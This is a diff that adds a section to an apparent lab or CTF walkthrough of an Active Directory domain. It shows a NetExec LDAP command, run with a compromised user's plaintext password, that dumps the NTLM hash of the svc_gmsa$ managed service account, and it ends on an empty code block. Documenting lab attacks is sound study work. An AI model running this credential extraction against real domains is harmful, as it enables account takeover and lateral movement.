@@ -427,6 +427,20 @@ This user is now compromised!
 
 This user can read the gMSA password of the `svc_gmsa$`
 
+# Compromising `svc_gmsa$`
 
+```python
+❯❯❯ nxc ldap dc01.kitsune.local -u 'pebble' -p 'PebbleIs47!' --gmsa            
+LDAP        10.1.176.128    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:kitsune.local) (signing:Enforced) (channel binding:Never) 
+LDAP        10.1.176.128    389    DC01             [+] kitsune.local\pebble:PebbleIs47! 
+LDAP        10.1.176.128    389    DC01             [*] Getting GMSA Passwords
+LDAP        10.1.176.128    389    DC01             Account: svc_gmsa$            NTLM: 085691c182d60ab1a12466ce7b50d29d     PrincipalsAllowedToReadPassword: IT
+```
+
+Ill read the value
+
+```python
+
+```
 
 
